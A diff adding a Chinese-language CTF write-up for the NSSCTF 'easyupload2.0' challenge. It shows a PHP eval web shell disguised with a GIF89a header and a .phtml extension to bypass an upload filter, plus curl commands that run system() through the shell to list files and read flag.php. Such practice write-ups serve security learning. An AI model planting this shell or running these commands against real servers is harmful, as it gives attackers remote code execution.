@@ -494,3 +494,57 @@ O:4:"wllm":2:{s:5:"admin";s:5:"admin";s:6:"passwd";s:3:"ctf";}
 ```text
 O%3A4%3A%22wllm%22%3A2%3A%7Bs%3A5%3A%22admin%22%3Bs%3A5%3A%22admin%22%3Bs%3A6%3A%22passwd%22%3Bs%3A3%3A%22ctf%22%3B%7D
 ```
+
+---
+
+## [[SWPUCTF 2021 新生赛]easyupload2.0 - NSSCTF](https://www.nssctf.cn/problem/423)
+### 思路
+1‍⃣打开环境看见的是要求传一个文件，于是上传一句话木马，同时又因为上传`php`文件显示“`php`是不行滴”，于是上传`shell.phtml`文件
+```php
+GIF89a
+<?php @eval($_POST['cmd']);?>
+```
+>`GIF89a`是`GIF`的文件头。很多上传检测只会粗略看文件开头是不是图片格式，加上这个可以让文件看起来更像`GIF`图片
+>`<?php @eval($_POST['cmd']);?>`：从 `POST` 参数 `cmd` 里取一段 `PHP` 代码，然后执行
+
+2‍⃣上传成功后网站显示
+```txt
+./upload/shell.phtml succesfully uploaded!
+```
+说明该文件被放到了
+```txt
+/upload/shell.phtml
+```
+
+3‍⃣因为上传的木马中写道：
+```php
+$_POST['cmd']
+```
+所以必须用`POST`传一个`cmd`参数
+```bash
+curl -X POST "http://靶机/upload/shell.phtml" -d "cmd=system('ls');"
+```
+此处真正执行的就是
+```php
+system('ls');
+```
+
+4‍⃣操作
+先在浏览器中访问木马地址
+```txt
+http://node4.anna.nssctf.cn:29689/upload/shell.phtml
+```
+```bash
+# 测试木马能否执行命令
+curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @{cmd="system('pwd');"}
+
+# 看当前目录有什么文件
+curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @{cmd="system('ls');"}
+
+# 查看网站根目录文件
+curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @{cmd="system('ls /var/www/html');“}
+
+# 查看flag文件
+ curl "http://node4.anna.nssctf.cn:29689/upload/shell.phtml" -Method POST -Body @{cmd="system('cat /var/www/html/flag.php');"}
+```
+成功读取`flag.php`文件得到`flag`
